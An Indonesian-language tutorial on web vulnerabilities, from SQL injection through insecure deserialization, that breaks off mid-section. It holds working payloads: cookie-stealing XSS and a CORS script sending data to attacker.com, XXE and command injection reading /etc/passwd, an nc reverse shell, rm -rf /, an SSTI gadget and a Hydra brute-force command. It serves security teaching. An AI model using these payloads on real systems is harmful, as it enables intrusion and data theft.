### **1. SQL Injection**

**Apa itu?**
SQL Injection adalah kerentanan di mana penyerang bisa menyisipkan atau "menyuntikkan" perintah SQL berbahaya ke dalam query yang dijalankan oleh aplikasi. Hal ini memungkinkan penyerang untuk mengakses, mengubah, atau menghapus data di database.

**Cara Enumerasi:**
- **Input Testing:** Coba masukkan karakter khusus seperti `' OR '1'='1` di field input (misalnya login).
- **Error Messages:** Perhatikan pesan error yang muncul, bisa memberi petunjuk tentang struktur database.
- **Automated Tools:** Gunakan alat seperti SQLmap untuk otomatis mendeteksi kerentanan.

**Cara Eksploitasi:**
- **Login Bypass:** Menggunakan payload seperti `' OR '1'='1` untuk melewati autentikasi.
- **Data Dumping:** Mengekstrak data sensitif seperti `UNION SELECT` untuk mengambil tabel dan kolom.

**Contoh Query:**
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password';
```

**Eksploitasi Detail:**
1. **Login Bypass:**
   - **Payload:** `' OR '1'='1`
   - **Proses:**
     - Penyerang memasukkan `admin` sebagai username dan `' OR '1'='1` sebagai password.
     - Query menjadi:
       ```sql
       SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
       ```
     - Kondisi `OR '1'='1'` selalu benar, sehingga query mengembalikan semua baris yang memenuhi username 'admin', memungkinkan penyerang masuk tanpa password yang valid.

2. **Data Dumping:**
   - **Payload:** `' UNION SELECT username, password FROM users --`
   - **Proses:**
     - Penyerang memasukkan payload di field input, misalnya di kolom pencarian.
     - Query menjadi:
       ```sql
       SELECT * FROM products WHERE name = '' UNION SELECT username, password FROM users --';
       ```
     - Bagian `UNION SELECT` menggabungkan hasil query awal dengan hasil query kedua yang mengambil username dan password dari tabel `users`, memungkinkan penyerang melihat data sensitif.

---

### **2. Cross-Site Scripting (XSS)**

**Apa itu?**
XSS memungkinkan penyerang menyuntikkan skrip berbahaya ke dalam halaman web yang dilihat oleh pengguna lain, mirip seperti menanam virus di halaman web.

**Cara Enumerasi:**
- **Input Fields:** Coba masukkan skrip sederhana seperti `<script>alert('XSS')</script>` di form input.
- **URL Parameters:** Manipulasi parameter URL untuk melihat apakah skrip dijalankan.
- **Automated Scanners:** Gunakan Burp Suite atau OWASP ZAP untuk mendeteksi XSS.

**Cara Eksploitasi:**
- **Reflected XSS:** Skrip dieksekusi langsung dari input pengguna tanpa disanitasi.
- **Stored XSS:** Skrip disimpan di database dan dieksekusi setiap kali halaman dimuat.

**Contoh Payload:**
```html
<script>alert('XSS')</script>
```

**Eksploitasi Detail:**
1. **Reflected XSS:**
   - **Payload:** `<script>alert('XSS')</script>`
   - **Proses:**
     - Penyerang memasukkan payload di kolom pencarian atau form komentar.
     - Jika aplikasi tidak menyanitasi input, skrip tersebut akan direfleksikan kembali ke browser pengguna.
     - Saat halaman dimuat, skrip dieksekusi dan menampilkan alert box dengan pesan 'XSS'.
     - Ini dapat dimanfaatkan untuk mencuri cookie pengguna atau melakukan tindakan tidak sah lainnya.

2. **Stored XSS:**
   - **Payload:** `<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>`
   - **Proses:**
     - Penyerang memasukkan payload di kolom komentar atau form input yang disimpan di database.
     - Setiap kali pengguna lain mengakses halaman tersebut, skrip akan dieksekusi di browser mereka.
     - Skrip dapat mengirimkan cookie pengguna ke server penyerang atau melakukan tindakan berbahaya lainnya.

---

### **3. Cross-Site Request Forgery (CSRF)**

**Apa itu?**
CSRF membuat pengguna yang sudah terautentikasi melakukan tindakan yang tidak diinginkan di aplikasi web tanpa sepengetahuan mereka, seperti transfer uang atau perubahan data profil.

**Cara Enumerasi:**
- **Token Absence:** Cek apakah aplikasi menggunakan token CSRF di form atau header.
- **SameSite Cookies:** Periksa pengaturan cookie untuk atribut `SameSite`.

**Cara Eksploitasi:**
- **Crafted Requests:** Buat halaman web lain yang secara otomatis mengirimkan permintaan ke aplikasi target saat pengguna mengunjungi halaman tersebut.

**Contoh:**
```html
<img src="https://target.com/transfer?amount=1000&to=attacker" />
```

**Eksploitasi Detail:**
1. **Membuat Halaman Palsu:**
   - Penyerang membuat halaman web palsu yang berisi tag `<img>` atau form tersembunyi yang mengirimkan permintaan ke aplikasi target.
   - **Payload:** `<img src="https://target.com/transfer?amount=1000&to=attacker" />`
   - Ketika pengguna yang sudah login di aplikasi target mengunjungi halaman palsu ini, browser mereka secara otomatis mengirimkan permintaan transfer uang ke aplikasi target.
   - Karena permintaan datang dari browser pengguna yang sudah terautentikasi, aplikasi target menganggap permintaan tersebut sah dan mengeksekusinya, sehingga uang dialihkan ke akun penyerang.

2. **Menggunakan Form Tersembunyi:**
   - Penyerang dapat menggunakan form tersembunyi dengan metode `POST` yang dikirimkan secara otomatis menggunakan JavaScript.
   - **Payload:**
     ```html
     <form action="https://target.com/transfer" method="POST">
       <input type="hidden" name="amount" value="1000">
       <input type="hidden" name="to" value="attacker">
     </form>
     <script>
       document.forms[0].submit();
     </script>
     ```
   - Form ini secara otomatis disubmit saat pengguna mengunjungi halaman, melakukan transfer uang tanpa sepengetahuan mereka.

---

### **4. Clickjacking**

**Apa itu?**
Clickjacking membuat pengguna mengklik sesuatu yang tidak mereka sadari, seperti menekan tombol tersembunyi di atas halaman web, yang dapat digunakan untuk mencuri klik atau melakukan tindakan tidak sah.

**Cara Enumerasi:**
- **Frame Busting:** Cek apakah aplikasi menggunakan header `X-Frame-Options` atau Content Security Policy (CSP) untuk mencegah framing.
- **Visual Testing:** Coba muat aplikasi dalam iframe dan lihat apakah diblokir.

**Cara Eksploitasi:**
- **Overlay Frames:** Tempatkan iframe transparan di atas elemen yang bisa diklik untuk mencuri klik pengguna.

**Contoh HTML:**
```html
<iframe src="https://target.com" style="opacity:0; position:absolute; top:0; left:0;"></iframe>
```

**Eksploitasi Detail:**
1. **Membuat Halaman Palsu dengan Iframe Transparan:**
   - Penyerang membuat halaman web yang berisi iframe yang memuat aplikasi target, seperti tombol "Delete Account" atau "Transfer Uang".
   - Iframe ditempatkan dengan `opacity:0` atau `visibility:hidden` sehingga tidak terlihat oleh pengguna.
   - **Payload:**
     ```html
     <iframe src="https://target.com/delete-account" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>
     ```
   - Selain itu, penyerang menambahkan elemen lain di atas iframe, seperti tombol palsu atau instruksi untuk mengklik di area tertentu.
   - Ketika pengguna mencoba mengklik tombol palsu, mereka sebenarnya mengklik tombol di dalam iframe, menjalankan tindakan tidak sah seperti menghapus akun mereka.

2. **Menggunakan CSS untuk Menyembunyikan Iframe:**
   - Penyerang dapat menggunakan CSS untuk menyembunyikan iframe namun tetap memungkinkan interaksi klik.
   - **Payload:**
     ```html
     <div style="position: relative;">
       <button style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 2;">Click Here</button>
       <iframe src="https://target.com/transfer" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%; z-index:1;"></iframe>
     </div>
     ```
   - Pengguna melihat tombol "Click Here" dan mengkliknya, tetapi sebenarnya mereka mengklik tombol transfer di dalam iframe.

---

### **5. DOM-based Vulnerabilities**

**Apa itu?**
Kerentanan ini terjadi ketika skrip di sisi klien memanipulasi DOM berdasarkan input pengguna tanpa sanitasi yang benar, memungkinkan eksekusi skrip berbahaya atau perubahan tampilan halaman.

**Cara Enumerasi:**
- **Review JavaScript:** Tinjau kode JavaScript untuk manipulasi DOM yang bergantung pada input pengguna.
- **Dynamic Content:** Manipulasi parameter URL atau input lain yang mempengaruhi DOM.

**Cara Eksploitasi:**
- **DOM XSS:** Suntikkan skrip melalui manipulasi DOM, misalnya melalui URL.

**Contoh Payload:**
```javascript
http://example.com/page#<script>alert('XSS')</script>
```

**Eksploitasi Detail:**
1. **Manipulasi URL Hash:**
   - Penyerang menambahkan skrip berbahaya ke bagian hash (`#`) dari URL.
   - **Payload:** `http://example.com/page#<script>alert('XSS')</script>`
   - Jika aplikasi membaca bagian hash dan langsung memasukkannya ke DOM tanpa sanitasi, skrip akan dieksekusi di browser pengguna.
   - **Proses:**
     - Browser mengakses URL dengan hash yang dimanipulasi.
     - JavaScript di halaman mengambil nilai hash dan memasukkannya ke dalam elemen HTML, misalnya:
       ```javascript
       document.getElementById('userInput').innerHTML = window.location.hash.substring(1);
       ```
     - Skrip berbahaya dieksekusi, memungkinkan penyerang melakukan tindakan seperti mencuri data pengguna atau mengubah tampilan halaman.

2. **Manipulasi Parameter URL untuk Mengubah DOM:**
   - Penyerang dapat memanipulasi parameter URL yang digunakan oleh JavaScript untuk memodifikasi konten halaman.
   - **Payload:** `http://example.com/page?name=<img src=x onerror=alert('XSS')>`
   - Jika aplikasi memasukkan nilai parameter `name` ke dalam DOM tanpa sanitasi, skrip `onerror` akan dieksekusi saat gambar gagal dimuat.
   - **Proses:**
     - Browser mengakses URL dengan parameter yang dimanipulasi.
     - JavaScript di halaman memasukkan nilai `name` ke dalam elemen HTML, misalnya:
       ```javascript
       document.getElementById('username').innerHTML = getParameterByName('name');
       ```
     - Gambar dengan sumber `x` gagal dimuat, memicu event `onerror` dan menjalankan skrip `alert('XSS')`.

---

### **6. Cross-Origin Resource Sharing (CORS)**

**Apa itu?**
CORS adalah mekanisme yang mengontrol bagaimana sumber daya diakses dari domain berbeda. Konfigurasi yang salah bisa memungkinkan penyerang mengakses data sensitif dari domain lain.

**Cara Enumerasi:**
- **Check CORS Headers:** Gunakan `curl` atau browser dev tools untuk melihat header `Access-Control-Allow-Origin`.
- **Allowed Origins:** Identifikasi origin yang diizinkan. Jika `*` diizinkan, ini berisiko karena siapa pun bisa mengakses data.

**Cara Eksploitasi:**
- **Malicious Origin:** Set origin ke yang diizinkan dan buat permintaan untuk mengakses data.

**Contoh Header:**
```http
Access-Control-Allow-Origin: *
```

**Eksploitasi Detail:**
1. **Menyiapkan Situs Penyerang:**
   - Penyerang membuat situs web di domain mereka sendiri, misalnya `attacker.com`.
   - Situs ini memiliki skrip JavaScript yang membuat permintaan ke API target yang memiliki CORS misconfigurasi.

2. **Membuat Permintaan dari Situs Penyerang:**
   - **Payload JavaScript:**
     ```javascript
     fetch('https://target.com/api/data', {
       method: 'GET',
       credentials: 'include'
     })
     .then(response => response.json())
     .then(data => {
       console.log(data);
       // Kirim data ke server penyerang
       fetch('https://attacker.com/steal', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify(data)
       });
     })
     .catch(error => console.error('Error:', error));
     ```
   - Skrip ini membuat permintaan ke `https://target.com/api/data` dan jika `Access-Control-Allow-Origin` disetel ke `*`, permintaan akan berhasil dan data akan diambil.
   - Data kemudian dikirim ke server penyerang di `https://attacker.com/steal`.

3. **Dampak:**
   - Penyerang dapat mengakses data sensitif dari API target yang seharusnya tidak diakses oleh domain lain.
   - Data seperti informasi pengguna, konfigurasi, atau data rahasia lainnya bisa dicuri dan digunakan untuk serangan lebih lanjut.

---

### **7. XML External Entity (XXE) Injection**

**Apa itu?**
XXE memungkinkan penyerang menyisipkan entitas eksternal ke dalam dokumen XML, yang bisa digunakan untuk membaca file lokal, mengakses layanan internal, atau melakukan serangan denial of service (DoS).

**Cara Enumerasi:**
- **Upload XML Files:** Coba unggah atau kirim XML dengan entitas eksternal.
- **Error Messages:** Perhatikan pesan error yang mengindikasikan parsing XML gagal.

**Cara Eksploitasi:**
- **File Disclosure:** Menggunakan entitas eksternal untuk membaca file di server.

**Contoh Payload:**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

**Eksploitasi Detail:**
1. **Menyisipkan Entitas Eksternal:**
   - Penyerang membuat dokumen XML yang menyertakan definisi entitas eksternal, seperti `xxe`.
   - **Payload XML:**
     ```xml
     <?xml version="1.0" encoding="ISO-8859-1"?>
     <!DOCTYPE foo [  
       <!ELEMENT foo ANY >
       <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
     <foo>&xxe;</foo>
     ```
   - Di sini, entitas `&xxe;` didefinisikan untuk membaca isi file `/etc/passwd`.

2. **Mengirimkan Payload ke Aplikasi Target:**
   - Penyerang mengunggah atau mengirimkan dokumen XML ini ke aplikasi target yang memproses XML, misalnya melalui form upload file atau API yang menerima data XML.

3. **Memproses dan Menampilkan Data:**
   - Jika aplikasi target tidak mengonfigurasi parser XML dengan benar (misalnya, tidak menonaktifkan ekstensi entitas), parser akan menginterpretasikan entitas `&xxe;` dan membaca isi file `/etc/passwd`.
   - Isi file tersebut kemudian dapat ditampilkan di halaman web atau dikirim kembali sebagai respons ke penyerang.

4. **Dampak:**
   - **File Disclosure:** Penyerang bisa membaca file-file sensitif di server, seperti konfigurasi, file password, atau data pengguna.
   - **Internal Network Access:** Dengan SSRF, penyerang bisa mengakses layanan internal yang tidak dapat diakses dari luar.
   - **Denial of Service (DoS):** Menggunakan entitas berulang atau rekursif untuk menyebabkan parser XML kehabisan sumber daya.

---

### **8. Server-Side Request Forgery (SSRF)**

**Apa itu?**
SSRF memungkinkan penyerang membuat server melakukan permintaan HTTP ke URL yang dipilih, yang bisa digunakan untuk mengakses layanan internal atau melakukan serangan lanjutan.

**Cara Enumerasi:**
- **Input Fields:** Cari input yang menerima URL atau alamat IP, seperti form URL gambar atau link.
- **Server Behavior:** Coba kirimkan berbagai URL dan lihat respons server.

**Cara Eksploitasi:**
- **Internal Network Access:** Arahkan server untuk mengakses URL internal seperti `http://localhost/admin`.

**Contoh Payload:**
```
http://localhost:8080/admin
```

**Eksploitasi Detail:**
1. **Menemukan Input yang Rentan:**
   - Penyerang mencari input di aplikasi yang menerima URL, seperti form untuk memasukkan URL gambar atau link ke sumber daya eksternal.

2. **Mengirimkan Payload ke Input:**
   - Penyerang memasukkan URL internal, misalnya `http://localhost:8080/admin`, ke dalam field yang menerima URL.
   - **Payload:** `http://localhost:8080/admin`

3. **Proses Permintaan:**
   - Aplikasi server melakukan permintaan HTTP ke URL yang diberikan.
   - Karena URL mengarah ke layanan internal (`localhost`), penyerang dapat mengakses layanan yang seharusnya tidak dapat diakses dari luar.

4. **Dampak:**
   - **Akses Layanan Internal:** Penyerang bisa mengakses endpoint internal seperti API admin, database internal, atau layanan lain yang berjalan di jaringan internal.
   - **Port Scanning:** Penyerang dapat mengirimkan berbagai payload untuk memindai port dan mengidentifikasi layanan yang berjalan di server internal.
   - **Data Exfiltration:** Mengambil data sensitif dari layanan internal yang diekspos melalui permintaan server.

---

### **9. HTTP Request Smuggling**

**Apa itu?**
HTTP Request Smuggling memanipulasi cara server memproses permintaan HTTP, memungkinkan penyerang untuk melewati kontrol keamanan atau mengakses data pengguna lain.

**Cara Enumerasi:**
- **Different Intermediaries:** Cek bagaimana server dan proxy menangani header HTTP seperti `Transfer-Encoding` dan `Content-Length`.
- **Payload Testing:** Kirim permintaan dengan konflik header dan lihat bagaimana diproses.

**Cara Eksploitasi:**
- **Session Hijacking:** Manipulasi permintaan untuk mengikat sesi pengguna ke sesi penyerang.

**Contoh Payload:**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
```

**Eksploitasi Detail:**
1. **Memahami Cara Kerja Server dan Proxy:**
   - Penyerang menganalisis bagaimana server dan proxy menangani header `Transfer-Encoding` dan `Content-Length`.
   - Jika ada perbedaan dalam penanganan antara server dan proxy, celah bisa dimanfaatkan.

2. **Membuat Permintaan yang Konflik:**
   - Penyerang membuat permintaan HTTP dengan header yang saling bertentangan, seperti `Content-Length: 13` dan `Transfer-Encoding: chunked`.
   - **Payload:**
     ```http
     POST / HTTP/1.1
     Host: vulnerable.com
     Content-Length: 13
     Transfer-Encoding: chunked

     0

     GET /admin HTTP/1.1
     Host: vulnerable.com
     ```

3. **Proses Permintaan:**
   - Proxy mungkin memproses permintaan berdasarkan `Transfer-Encoding: chunked`, menganggap permintaan selesai setelah membaca chunk.
   - Server, di sisi lain, mungkin memproses berdasarkan `Content-Length`, menganggap ada data tambahan setelah chunk.
   - Permintaan `GET /admin HTTP/1.1` dapat diperlakukan sebagai permintaan terpisah oleh server, tanpa sepengetahuan proxy.

4. **Dampak:**
   - **Session Hijacking:** Penyerang dapat mengakses sesi pengguna lain atau mengikat sesi pengguna ke sesi penyerang.
   - **Cache Poisoning:** Menginjeksi konten berbahaya ke cache server yang kemudian dilihat oleh pengguna lain.
   - **Bypassing Security Controls:** Mengakses halaman atau API yang seharusnya dilindungi oleh kontrol keamanan tambahan.

---

### **10. OS Command Injection**

**Apa itu?**
OS Command Injection memungkinkan penyerang menjalankan perintah sistem operasi pada server melalui input aplikasi yang tidak divalidasi dengan benar.

**Cara Enumerasi:**
- **Input Fields:** Cari input yang diteruskan ke perintah shell, seperti field ping atau traceroute.
- **Special Characters:** Coba masukkan karakter seperti `;`, `&&`, atau `|` untuk memisahkan perintah.

**Cara Eksploitasi:**
- **Command Execution:** Jalankan perintah berbahaya seperti `rm -rf /`.
- **Reverse Shell:** Buka koneksi balik ke penyerang.

**Contoh Payload:**
```
127.0.0.1; cat /etc/passwd
```

**Eksploitasi Detail:**
1. **Mencari Input yang Rentan:**
   - Penyerang mencari form atau input di aplikasi yang menjalankan perintah sistem, seperti form untuk melakukan ping ke alamat IP atau domain.

2. **Menyisipkan Karakter Khusus:**
   - Penyerang memasukkan payload dengan karakter khusus untuk memisahkan perintah.
   - **Payload:** `127.0.0.1; cat /etc/passwd`
   - Jika aplikasi tidak memvalidasi input, perintah `cat /etc/passwd` akan dijalankan setelah perintah `ping`.

3. **Proses Eksekusi Perintah:**
   - Aplikasi menjalankan perintah shell yang disusun dengan input pengguna.
   - **Contoh Command yang Dijalankan:**
     ```bash
     ping 127.0.0.1; cat /etc/passwd
     ```
   - Perintah `ping` dijalankan terlebih dahulu, diikuti oleh `cat /etc/passwd`, yang menampilkan isi file `/etc/passwd`.

4. **Dampak:**
   - **Data Disclosure:** Penyerang bisa membaca file sistem yang sensitif seperti `/etc/passwd`, yang berisi informasi pengguna.
   - **Remote Code Execution:** Penyerang bisa menjalankan perintah berbahaya seperti `rm -rf /` untuk menghapus file atau `nc -e /bin/bash attacker.com 4444` untuk membuka reverse shell.
   - **Privilege Escalation:** Jika server berjalan dengan hak istimewa, penyerang bisa mendapatkan kontrol penuh atas sistem.

---

### **11. Server-Side Template Injection (SSTI)**

**Apa itu?**
SSTI memungkinkan penyerang menyuntikkan kode berbahaya ke dalam template engine server, seperti Jinja2 atau Twig, memungkinkan eksekusi kode atau akses data sensitif.

**Cara Enumerasi:**
- **Template Syntax:** Cari input yang diproses oleh template engine seperti Jinja2, Twig, atau Handlebars.
- **Error Messages:** Perhatikan pesan error yang mengindikasikan interpretasi template.

**Cara Eksploitasi:**
- **Code Execution:** Masukkan payload yang dieksekusi oleh template engine.

**Contoh Payload (Jinja2):**
```
{{ config }}
```

**Eksploitasi Detail:**
1. **Menemukan Input yang Rentan:**
   - Penyerang mencari form atau input di aplikasi yang menggunakan template engine untuk merender konten, seperti form komentar atau form profil pengguna.

2. **Menyisipkan Payload Template:**
   - Penyerang memasukkan payload yang mengandung sintaks template engine, seperti `{{ config }}` di Jinja2.
   - **Payload:** `{{ config }}`

3. **Proses Rendering Template:**
   - Aplikasi menggunakan template engine untuk merender input pengguna ke dalam halaman web.
   - Jika input tidak disanitasi, payload akan diinterpretasikan oleh template engine.
   - **Contoh Rendered Template:**
     ```html
     <div>
       User Configuration: {{ config }}
     </div>
     ```
   - `{{ config }}` akan dieksekusi dan menampilkan konfigurasi server atau variabel lain yang tersedia dalam konteks template.

4. **Dampak:**
   - **Code Execution:** Penyerang bisa menjalankan kode di server jika template engine memungkinkan eksekusi perintah, seperti `{{ ''.__class__.__mro__[1].__subclasses__()[283]('id') }}` untuk menjalankan perintah `id` di server.
   - **Data Exfiltration:** Mengakses data sensitif seperti konfigurasi aplikasi, variabel lingkungan, atau data pengguna.
   - **Privilege Escalation:** Jika penyerang dapat menjalankan kode, mereka bisa mendapatkan akses penuh ke sistem.

---

### **12. Directory Traversal**

**Apa itu?**
Directory Traversal memungkinkan penyerang mengakses file di server yang seharusnya tidak dapat diakses dengan menggunakan path traversal (`../`), memungkinkan mereka membaca atau mengubah file sistem.

**Cara Enumerasi:**
- **File Access:** Coba akses file dengan path traversal, seperti `../../etc/passwd`.
- **Input Fields:** Cari input yang menerima path file atau direktori, seperti form download file.

**Cara Eksploitasi:**
- **File Disclosure:** Akses file sensitif seperti `../../../../etc/passwd`.

**Contoh URL:**
```
http://example.com/download?file=../../../../etc/passwd
```

**Eksploitasi Detail:**
1. **Menemukan Endpoint yang Rentan:**
   - Penyerang mencari URL atau endpoint di aplikasi yang menerima path file, seperti `http://example.com/download?file=filename`.

2. **Menyisipkan Path Traversal:**
   - Penyerang memasukkan path traversal ke parameter `file` untuk naik ke direktori induk dan mengakses file sistem.
   - **Payload:** `../../../../etc/passwd`

3. **Proses Akses File:**
   - Aplikasi membangun path file berdasarkan input pengguna tanpa memvalidasi atau membatasi path.
   - **Contoh Path yang Dibangun:**
     ```python
     base_path = "/var/www/html/uploads/"
     file_path = base_path + "../../../../etc/passwd"
     ```
   - Path ini direduksi menjadi `/etc/passwd`, yang dapat diakses oleh aplikasi.

4. **Dampak:**
   - **File Disclosure:** Penyerang bisa membaca file sistem seperti `/etc/passwd` yang berisi informasi pengguna.
   - **Configuration Disclosure:** Mengakses file konfigurasi seperti `config.php` yang berisi kredensial database.
   - **Code Injection:** Mengakses file aplikasi yang bisa dimodifikasi atau dijalankan ulang oleh penyerang.

---

### **13. Access Control Vulnerabilities**

**Apa itu?**
Kerentanan kontrol akses terjadi ketika aplikasi tidak secara benar membatasi akses pengguna ke sumber daya atau fungsi tertentu, memungkinkan penyerang untuk mengakses atau mengubah data yang seharusnya dilindungi.

**Cara Enumerasi:**
- **Role Testing:** Coba akses URL atau fungsi yang seharusnya hanya untuk admin sebagai pengguna biasa.
- **Parameter Manipulation:** Ubah parameter seperti `user_id` untuk mengakses data pengguna lain.

**Cara Eksploitasi:**
- **Privilege Escalation:** Tingkatkan hak akses dari pengguna biasa menjadi admin.
- **Data Breach:** Akses atau ubah data sensitif yang seharusnya tidak dapat diakses.

**Contoh:**
Mengubah URL dari:
```
http://example.com/profile?user_id=123
```
Menjadi:
```
http://example.com/profile?user_id=1
```
Untuk mengakses profil admin.

**Eksploitasi Detail:**
1. **Mengidentifikasi Endpoint yang Rentan:**
   - Penyerang menemukan URL atau endpoint yang menerima parameter seperti `user_id` untuk menampilkan profil pengguna.

2. **Memanipulasi Parameter:**
   - Penyerang mengubah nilai `user_id` dari ID pengguna biasa ke ID pengguna dengan hak akses lebih tinggi, seperti admin.
   - **Payload:** `http://example.com/profile?user_id=1`

3. **Proses Akses Data:**
   - Aplikasi mengambil data berdasarkan `user_id` tanpa memeriksa apakah pengguna yang membuat permintaan memiliki hak akses untuk melihat data tersebut.
   - **Contoh Query:**
     ```sql
     SELECT * FROM users WHERE user_id = 1;
     ```
   - Ini memungkinkan penyerang melihat atau mengubah profil admin.

4. **Dampak:**
   - **Privilege Escalation:** Penyerang dapat mengakses fungsi atau data yang hanya diizinkan untuk admin, seperti mengubah pengaturan sistem atau menghapus data pengguna lain.
   - **Data Breach:** Mengakses informasi sensitif pengguna lain, seperti data pribadi, riwayat transaksi, atau informasi finansial.

---

### **14. Authentication Vulnerabilities**

**Apa itu?**
Kerentanan autentikasi terjadi ketika mekanisme login tidak aman, memungkinkan penyerang masuk tanpa kredensial yang valid atau mendapatkan akses yang tidak sah.

**Cara Enumerasi:**
- **Brute Force:** Coba banyak kombinasi username dan password menggunakan tool seperti Hydra.
- **Credential Stuffing:** Gunakan kredensial bocor dari situs lain.
- **Default Credentials:** Cek apakah aplikasi menggunakan kredensial default seperti `admin/admin`.

**Cara Eksploitasi:**
- **Session Hijacking:** Ambil sesi pengguna yang sah melalui pencurian cookie atau token.
- **Credential Reuse:** Menggunakan kredensial yang sama di berbagai situs untuk mendapatkan akses tidak sah.

**Contoh Payload:**
Gunakan tool seperti Hydra untuk brute force:
```
hydra -l admin -P passwords.txt http-get://example.com/login
```

**Eksploitasi Detail:**
1. **Brute Force:**
   - Penyerang menggunakan tool seperti Hydra untuk mencoba banyak kombinasi username dan password secara otomatis.
   - **Command:**
     ```
     hydra -l admin -P passwords.txt http-get://example.com/login
     ```
   - Tool ini akan mencoba setiap password dari file `passwords.txt` untuk username `admin` hingga menemukan yang benar atau mencapai batas percobaan.

2. **Credential Stuffing:**
   - Penyerang menggunakan kredensial yang bocor dari pelanggaran data di situs lain.
   - **Proses:**
     - Penyerang mendapatkan daftar username dan password dari pelanggaran data.
     - Menggunakan daftar tersebut untuk mencoba login ke aplikasi target.
   - **Dampak:**
     - Jika pengguna menggunakan kredensial yang sama di berbagai situs, penyerang dapat mengakses akun mereka di aplikasi target.

3. **Default Credentials:**
   - Penyerang memeriksa apakah aplikasi menggunakan kredensial default yang umum, seperti `admin/admin` atau `root/root`.
   - **Proses:**
     - Coba login dengan kombinasi default.
     - Jika berhasil, penyerang mendapatkan akses penuh tanpa perlu menebak password.

4. **Session Hijacking:**
   - Penyerang mencuri sesi pengguna yang sah melalui pencurian cookie atau token autentikasi.
   - **Proses:**
     - Menggunakan teknik seperti Cross-Site Scripting (XSS) untuk mencuri cookie.
     - Menyisipkan token autentikasi yang dicuri ke dalam permintaan mereka untuk mengambil alih sesi pengguna.
   - **Dampak:**
     - Penyerang dapat melakukan tindakan atas nama pengguna yang sah, seperti mengubah pengaturan akun atau melakukan transaksi.

---

### **15. WebSockets**

**Apa itu?**
WebSockets memungkinkan komunikasi dua arah antara klien dan server. Kerentanan bisa terjadi jika handshake atau komunikasi tidak aman, memungkinkan penyerang menyisipkan pesan berbahaya atau mengambil alih koneksi.

**Cara Enumerasi:**
- **WebSocket Tools:** Gunakan browser dev tools atau alat seperti `wscat` untuk menguji koneksi WebSocket.
- **Handshake Testing:** Coba manipulasi header handshake untuk melihat respons server.

**Cara Eksploitasi:**
- **Hijack Connection:** Manipulasi pesan WebSocket untuk mencuri data atau mengirim perintah berbahaya.
- **Data Exfiltration:** Ambil data yang dikirim melalui WebSocket dengan menyisipkan skrip atau mengubah pesan.

**Contoh Payload:**
```json
{
  "type": "command",
  "data": "shutdown"
}
```

**Eksploitasi Detail:**
1. **Mengidentifikasi Koneksi WebSocket:**
   - Penyerang menggunakan browser developer tools untuk menemukan koneksi WebSocket yang terbuka antara klien dan server.
   - Melihat URL WebSocket, misalnya `wss://example.com/socket`.

2. **Menggunakan Alat WebSocket:**
   - Penyerang menggunakan alat seperti `wscat` untuk menghubungkan ke server WebSocket.
   - **Command:**
     ```
     wscat -c wss://example.com/socket
     ```
   - Setelah terhubung, penyerang dapat mengirim dan menerima pesan.

3. **Mengirimkan Payload Berbahaya:**
   - Penyerang mengirimkan pesan JSON yang berisi perintah berbahaya.
   - **Payload:**
     ```json
     {
       "type": "command",
       "data": "shutdown"
     }
     ```
   - Jika server tidak memvalidasi atau menyaring pesan dengan benar, perintah `shutdown` akan dijalankan di server.

4. **Data Exfiltration:**
   - Penyerang dapat mengubah pesan untuk mencuri data, misalnya:
     ```json
     {
       "type": "data",
       "data": "secret_info"
     }
     ```
   - Server mungkin mengirimkan data sensitif kembali ke penyerang melalui koneksi WebSocket.

5. **Dampak:**
   - **Remote Code Execution:** Penyerang bisa menjalankan perintah sistem di server.
   - **Data Theft:** Mencuri data sensitif yang dikirim melalui WebSocket.
   - **Service Disruption:** Mengirim perintah untuk menghentikan atau merusak layanan.

---

### **16. Web Cache Poisoning**

**Apa itu?**
Web Cache Poisoning memungkinkan penyerang menyuntikkan konten berbahaya ke dalam cache web, sehingga pengguna lain menerima konten yang dimanipulasi, seperti skrip XSS.

**Cara Enumerasi:**
- **Cache Headers:** Cek header cache seperti `Cache-Control` dan `Vary` menggunakan `curl` atau browser dev tools.
- **Parameter Testing:** Uji berbagai parameter URL untuk melihat apakah cache dipengaruhi.

**Cara Eksploitasi:**
- **Inject Malicious Content:** Kirimkan permintaan dengan payload berbahaya yang disimpan di cache, seperti skrip XSS di parameter URL.

**Contoh Payload:**
```http
GET /search?q=<script>alert('Poison')</script> HTTP/1.1
Host: example.com
```

**Eksploitasi Detail:**
1. **Menganalisis Kebijakan Cache:**
   - Penyerang menggunakan `curl` untuk melihat header cache aplikasi target.
   - **Command:**
     ```
     curl -I "http://example.com/search?q=test"
     ```
   - Menilai apakah respons menggunakan `Cache-Control`, `ETag`, atau header lain yang mengontrol caching.

2. **Menyisipkan Payload Berbahaya:**
   - Penyerang membuat permintaan dengan parameter yang mengandung skrip berbahaya.
   - **Payload:**
     ```http
     GET /search?q=<script>alert('Poison')</script> HTTP/1.1
     Host: example.com
     ```
   - Jika aplikasi tidak menyanitasi input dan mengizinkan caching berdasarkan parameter `q`, konten berbahaya akan disimpan di cache.

3. **Memverifikasi Cache Poisoning:**
   - Penyerang mengakses kembali URL dengan parameter yang sama dan melihat apakah skrip dieksekusi.
   - Jika skrip dijalankan, berarti cache telah terkontaminasi.

4. **Dampak:**
   - **Reflected XSS untuk Pengguna Lain:** Semua pengguna yang mengakses halaman yang ter-cache dengan payload akan menjalankan skrip berbahaya.
   - **Data Theft atau Phishing:** Skrip XSS dapat mencuri cookie pengguna, melakukan redirect ke situs phishing, atau mengubah tampilan halaman untuk menipu pengguna.

---

### **17. Insecure Deserialization**

**Apa itu?**
Insecure Deserialization terjadi ketika aplikasi menerima data terserialisasi yang tidak terpercaya dan mendeserialize tanpa validasi, memungkinkan eksekusi kode berbahaya atau manipulasi data.

**Cara Enumerasi:**
- **Input Fields:** Cari input yang menerima data serialized seperti JSON atau XML.
